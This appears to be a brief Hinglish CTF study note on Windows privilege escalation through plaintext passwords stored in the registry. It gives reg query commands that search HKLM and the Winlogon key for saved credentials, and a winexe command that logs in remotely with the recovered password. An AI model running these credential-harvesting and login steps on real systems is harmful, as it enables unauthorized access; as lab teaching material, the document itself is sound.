**Concept — Ye hota kya hai?**

Windows Registry mein sirf service configs nahi hoti — kabhi kabhi **plaintext passwords** bhi store ho jaate hain.

Kyun? Kyunki:

- AutoLogon feature use kiya ho (automatic login) → credentials registry mein save hote hain
- Kisi software ne password registry mein store kiya ho

---

**Vulnerability — Galat kya hua?**

Passwords ko registry mein store karna insecure hai — koi bhi low priv user registry read kar sakta hai aur credentials nikal sakta hai.

---

**General Commands — Kisi bhi CTF machine pe:**

**1. Poori registry mein password dhundho**

cmd

```cmd
reg query HKLM /f password /t REG_SZ /s
```

Slow hoga — saari registry scan karega

**2. AutoLogon credentials directly dekho**

cmd

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

`DefaultUsername` aur `DefaultPassword` milega agar AutoLogon set hai

**3. Mila password use karo — Kali se login**

cmd

```cmd
winexe -U 'admin%password' //<target-IP> cmd.exe
```